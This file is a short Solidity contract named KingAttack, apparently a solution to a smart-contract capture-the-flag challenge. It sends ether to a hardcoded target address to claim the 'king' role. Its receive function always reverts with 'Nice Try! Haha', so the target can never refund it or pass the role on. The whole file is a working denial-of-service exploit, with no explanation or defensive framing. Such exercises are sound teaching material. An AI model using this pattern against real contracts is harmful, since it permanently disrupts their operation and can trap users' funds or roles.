// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract KingAttack{
    address payable public target = 0x8c7E670115035822255e3CD9bE214114f9078170;

    function transferAndBecomeKing() public payable{
        (bool os, ) = payable(target).call{value: msg.value}("");
        require(os);
    }

    function addSomeEth() public payable{

    }

    receive() external payable{
        revert("Nice Try! Haha");
    }

}
